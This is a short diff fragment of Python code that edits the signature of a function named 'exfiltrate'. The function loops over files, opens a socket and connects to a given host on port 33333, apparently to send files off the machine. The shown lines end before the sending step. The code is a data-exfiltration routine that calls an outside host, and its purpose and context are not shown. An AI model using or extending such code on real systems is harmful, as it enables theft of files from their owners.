@@ -3,7 +3,7 @@ import socket
 from time import sleep
 
 
-def exfiltrate(host_ip, files, path):
+def exfiltrate(host_ip, files):
     for file in files:
         sock = socket.socket()
         sock.connect((host_ip, 33333))
